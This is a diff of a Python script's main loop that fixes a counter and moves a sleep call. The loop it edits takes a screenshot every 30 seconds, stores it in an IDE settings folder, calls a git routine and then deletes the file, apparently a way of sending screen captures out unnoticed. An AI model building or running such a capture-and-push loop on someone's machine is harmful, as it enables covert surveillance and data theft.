@@ -36,9 +36,10 @@ def compressMe(fp):
 
 
 if __name__ == '__main__':
+    count = 0
 
     while True:
-        count = 0
+
         filename = str(time.time_ns())
         source = os.getcwd() + "\\.idea\\ping\\" + filename + ".png"
         g.screenshot(source)
@@ -47,6 +48,6 @@ if __name__ == '__main__':
         git()
         time.sleep(0.5)
         remove()
-        time.sleep(30)
         count += 1
         print(f"Iteration no. {count}")
+        time.sleep(30)
